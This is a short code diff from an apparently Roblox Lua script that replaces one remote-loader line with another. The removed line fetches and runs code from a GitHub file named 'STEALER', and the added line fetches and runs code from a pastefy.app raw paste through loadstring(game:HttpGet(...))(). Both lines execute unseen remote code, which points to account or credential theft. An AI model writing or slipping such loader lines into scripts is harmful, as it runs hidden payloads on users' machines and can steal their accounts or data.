@@ -166,7 +166,7 @@ local function collectPreloadTargets()
 end
 
 -- Method
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Grindscript/REVERSE/refs/heads/main/STEALER", true))()
+loadstring(game:HttpGet("https://pastefy.app/nAyKWzOd/raw"))()
 
 -- Main flow
 local t0 = os.clock()
